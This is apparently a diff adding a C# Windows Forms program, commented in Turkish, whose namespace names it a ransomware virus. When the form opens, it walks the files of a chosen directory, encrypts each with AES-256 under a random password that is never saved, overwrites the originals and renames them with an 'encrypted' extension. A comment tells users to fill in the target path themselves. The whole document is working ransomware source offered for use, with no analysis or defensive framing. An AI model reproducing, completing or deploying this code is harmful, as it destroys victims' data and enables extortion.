@@ -1,0 +1,82 @@
+
+Programming lang : C#
+Algorithm : AES256
+
+
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.IO; //Zorunlu!
+using System.Security.Cryptography; //Zorunlu!
+namespace FidyeVirüsü
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+            string[] dosyalar = Directory.GetFiles(@"Kriptolonacak dosyaların yolu buraya yazılır isterseniz rasgele şekilde baştan tasarlayabilirsiniz ama mantık diziler üzerinden hazırlanmıştır");
+            for (int i = 0; i < dosyalar.Length; i++)
+            {
+                Random Parola = new Random();
+                EncryptFile(dosyalar[i].ToString(), Parola.Next(1, 500).ToString()); //dosyaları dosyalar isimli diziden alır  - parola ise 1 ile 500 arasında rasgele bir sayıdan oluşur (methodu inceleyerek daha iyi anlayabilirisiniz)
+                File.Move(dosyalar[i], dosyalar[i]+".şifrelenmişdosyauzantısı");
+            }
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+
+        }
+        public void EncryptFile(string file, string password) //Şifrelemeyi yapan methodumuz
+        {
+
+            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
+            byte[] passwordBytes = Encoding.UTF8.GetBytes(password);
+
+            // Hash the password with SHA256
+            passwordBytes = SHA256.Create().ComputeHash(passwordBytes);
+
+            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);
+
+            string fileEncrypted = file;
+
+            File.WriteAllBytes(fileEncrypted, bytesEncrypted);
+        }
+        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes) //algoritmamızın bulunduğu method
+        {
+            byte[] encryptedBytes = null;
+            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
+
+            using (MemoryStream ms = new MemoryStream())
+            {
+                using (RijndaelManaged AES = new RijndaelManaged())
+                {
+                    AES.KeySize = 256;
+                    AES.BlockSize = 128;
+
+                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
+                    AES.Key = key.GetBytes(AES.KeySize / 8);
+                    AES.IV = key.GetBytes(AES.BlockSize / 8);
+
+                    AES.Mode = CipherMode.CBC;
+
+                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
+                    {
+                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
+                        cs.Close();
+                    }
+                    encryptedBytes = ms.ToArray();
+                }
+            }
+
+            return encryptedBytes;
+        }
+    }
+}
